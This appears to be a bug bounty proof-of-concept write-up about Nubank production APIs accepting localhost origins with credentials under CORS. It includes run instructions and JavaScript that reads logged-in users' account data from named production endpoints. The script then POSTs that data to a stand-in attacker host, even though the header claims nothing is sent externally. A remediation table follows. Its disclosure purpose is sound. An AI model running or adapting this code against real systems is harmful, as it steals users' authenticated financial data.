Nubank CORS Vulnerability — localhost Origin Accepted with Credentials

Bugcrowd Bug Bounty Research PoC
Program: Nubank | Researcher probe header: X-Correlation-Id: bc-handle
No data is sent to external servers. All requests are cross-origin reads only.

How to Run This PoC

Prerequisites: Be logged into Nubank (nu.com.co or nubank.com.br) in the same browser.

Steps:

  1. Save this HTML file locally.
  2. In a terminal, run: python3 -m http.server 8080 in the same directory.
  3. Open http://localhost:8080/cors_poc_localhost.html in the same browser where you are logged into Nubank.
  4. Your Nubank account data will be displayed below.

Note: Opening directly as file:// will show "CORS blocked" — serve via localhost as instructed above.

Vulnerability Evidence

All production Nubank microservices accept localhost origins with credentials — confirmed across all TLDs

Complete Exfiltration Code (Attacker's malicious local server)

<!-- Served from http://localhost:PORT/ by attacker's malicious local software -->
<script>
const targets = [
  'https://prod-global-auth.nu.com.co/api/me',
  'https://prod-global-auth.nubank.com.br/api/me',
  'https://prod-global-auth.nu.com.mx/api/me',
  'https://prod-global-stevie.prod-waf.nu.com.co/api/protected-hello/activation/usage',
  'https://prod-global-stevie.prod-waf.nu.com.co/api/call-management/v2/advices'
];

Promise.all(targets.map(url =>
  fetch(url, {
    credentials: 'include',
    headers: { 'X-Correlation-Id': 'bc-handle' }
  })
  .then(r => r.json())
  .then(data => ({ url, data }))
  .catch(e => ({ url, error: e.message }))
))
.then(results => {
  // Exfiltrate all Nubank user data to attacker's remote server
  fetch('https://attacker-c2.example.com/collect', {
    method: 'POST',
    body: JSON.stringify(results)
  });
  document.body.innerHTML = JSON.stringify(results, null, 2);
});
</script>

Remediation

FixDetail
Remove localhost from CORS allowlistlocalhost and 127.0.0.1 must not be in the CORS allowlist for production APIs — these are developer-convenience origins not appropriate for production
Restrict allowlist to exact production originsAllow only: https://nu.com.co, https://nu.com.mx, https://nubank.com.br (exact match, no subdomains, no localhost)
Remove wildcard subdomain reflectionThe Istio service mesh reflects any *.nu.com.co, *.nu.com.mx, *.nubank.com.br subdomain — replace with static allowlist in Istio VirtualService/EnvoyFilter
Scope session cookies properlySession cookies should use SameSite=Strict or SameSite=Lax to prevent cross-origin cookie sending
